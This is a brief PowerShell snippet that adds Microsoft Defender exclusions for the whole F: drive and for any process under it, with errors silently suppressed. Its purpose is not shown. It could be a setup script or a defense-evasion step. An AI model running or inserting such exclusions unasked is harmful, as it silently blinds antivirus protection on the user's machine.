Write-Host "    [+] Adding exclusions for F drive"
$exclusionPaths = @("F:\", "F:\*")
foreach ($path in $exclusionPaths) {
    if ($path -eq "F:\") {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } else {
        Add-MpPreference -ExclusionProcess $path -ErrorAction SilentlyContinue
    }
}
